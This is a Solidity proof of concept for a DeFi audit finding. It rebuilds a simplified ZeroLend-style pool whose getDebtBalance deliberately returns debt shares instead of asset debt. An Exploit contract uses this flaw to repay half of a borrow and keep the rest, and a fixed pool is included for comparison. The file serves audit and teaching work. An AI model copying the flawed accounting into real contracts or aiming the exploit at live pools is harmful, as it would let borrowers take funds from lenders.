// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ZeroLend One PositionBalanceConfiguration.getDebtBalance
    (Sherlock 2024-06, finding 41821)
    getDebtBalance returns debt shares plus the interest delta. When the index
    equals lastDebtLiquidtyIndex the delta is 0, so the function returns the
    share amount. At index 2e27 a 2 token borrow is 1 share. repay(max) pulls
    1 token, zeroes the shares, and the borrower keeps the other token.
    The supplier who posted 4 tokens can only be paid 3.

    CREATE order inside Exploit:
      nonce 1 Token, 2 Pool, 3 Supplier
*/

library Ray {
    uint256 internal constant RAY_UNIT = 1e27;

    function rayMul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b / RAY_UNIT;
    }

    function rayDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * RAY_UNIT / b;
    }
}

using Ray for uint256;

library PositionBalanceConfiguration {
    struct PositionBalance {
        uint256 debtShares;
        uint256 lastDebtLiquidtyIndex;
    }

    function getDebtBalance(PositionBalance storage self, uint256 index) internal view returns (uint256 debt) {
        uint256 increase = self.debtShares.rayMul(index) - self.debtShares.rayMul(self.lastDebtLiquidtyIndex);
        // @> VULN: returns the share amount plus the delta, not the asset debt self.debtShares.rayMul(index)
        return self.debtShares + increase;
    }
}

contract Token {
    string public symbol = "TKA";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    using PositionBalanceConfiguration for PositionBalanceConfiguration.PositionBalance;

    Token public token;
    uint256 public liquidityIndex = 2e27;
    uint256 public trueDebtBeforePay;
    uint256 public reportedDebt;
    uint256 public paid;
    mapping(address => uint256) public supplied;
    mapping(address => PositionBalanceConfiguration.PositionBalance) internal positions;

    constructor(Token _token) {
        token = _token;
    }

    function supply(uint256 assets) external {
        token.transferFrom(msg.sender, address(this), assets);
        supplied[msg.sender] += assets;
    }

    function borrow(uint256 assets) external {
        uint256 shares = assets.rayDiv(liquidityIndex);
        positions[msg.sender].debtShares = shares;
        positions[msg.sender].lastDebtLiquidtyIndex = liquidityIndex;
        token.transfer(msg.sender, assets);
    }

    function debtSharesOf(address user) external view returns (uint256) {
        return positions[user].debtShares;
    }

    function repay(uint256 amount) external {
        uint256 index = liquidityIndex;
        trueDebtBeforePay = positions[msg.sender].debtShares.rayMul(index);
        uint256 reported = positions[msg.sender].getDebtBalance(index);
        reportedDebt = reported;
        uint256 pay = amount;
        if (amount == type(uint256).max) {
            pay = reported;
        }
        token.transferFrom(msg.sender, address(this), pay);
        if (pay >= reported) {
            positions[msg.sender].debtShares = 0;
        }
        paid = pay;
    }
}

contract PoolFixed {
    Token public token;
    uint256 public liquidityIndex = 2e27;
    uint256 public paid;
    mapping(address => uint256) public debtShares;
    mapping(address => uint256) public supplied;

    constructor(Token _token) {
        token = _token;
    }

    function supply(uint256 assets) external {
        token.transferFrom(msg.sender, address(this), assets);
        supplied[msg.sender] += assets;
    }

    function borrow(uint256 assets) external {
        debtShares[msg.sender] = assets.rayDiv(liquidityIndex);
        token.transfer(msg.sender, assets);
    }

    function repay(uint256 amount) external {
        uint256 reported = debtShares[msg.sender].rayMul(liquidityIndex);
        uint256 pay = amount == type(uint256).max ? reported : amount;
        token.transferFrom(msg.sender, address(this), pay);
        if (pay >= reported) debtShares[msg.sender] = 0;
        paid = pay;
    }
}

contract Supplier {
    function supply(Pool pool, Token token, uint256 amount) external {
        token.approve(address(pool), amount);
        pool.supply(amount);
    }

    function supplyFixed(PoolFixed pool, Token token, uint256 amount) external {
        token.approve(address(pool), amount);
        pool.supply(amount);
    }
}

contract Exploit {
    Token public token;
    Pool public pool;
    Supplier public supplier;
    uint256 public kept;

    constructor() {
        token = new Token();
        pool = new Pool(token);
        supplier = new Supplier();
        token.mint(address(supplier), 4 ether);
    }

    function run() external {
        supplier.supply(pool, token, 4 ether);
        pool.borrow(2 ether);
        require(pool.debtSharesOf(address(this)) == 1 ether, "one share");
        token.approve(address(pool), type(uint256).max);
        pool.repay(type(uint256).max);
        require(pool.trueDebtBeforePay() == 2 ether, "true debt");
        require(pool.reportedDebt() == 1 ether, "reported");
        require(pool.paid() == 1 ether, "paid");
        require(pool.debtSharesOf(address(this)) == 0, "cleared");
        kept = token.balanceOf(address(this));
        require(kept == 1 ether, "kept");
        require(token.balanceOf(address(pool)) == 3 ether, "supplier short");
    }
}
